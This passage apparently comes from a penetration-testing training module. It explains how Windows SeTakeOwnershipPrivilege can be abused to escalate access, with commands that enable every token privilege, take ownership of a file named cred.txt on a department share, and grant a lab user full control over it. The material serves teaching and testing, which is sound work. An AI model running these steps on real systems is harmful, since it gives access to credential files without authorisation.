

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights. These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.

---

#### Enabling SeTakeOwnershipPrivilege

Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```
Import-Module .\Enable-Privilege.ps1
```

```
.\EnableAllTokenPrivs.ps1
```

```
whoami /priv
```


#### Checking File Ownership

```
cmd /c dir /q 'C:\Department Shares\Private\IT'
```


#### Taking Ownership of the File

```
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

Let's grant our user full privileges over the target file.

```
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
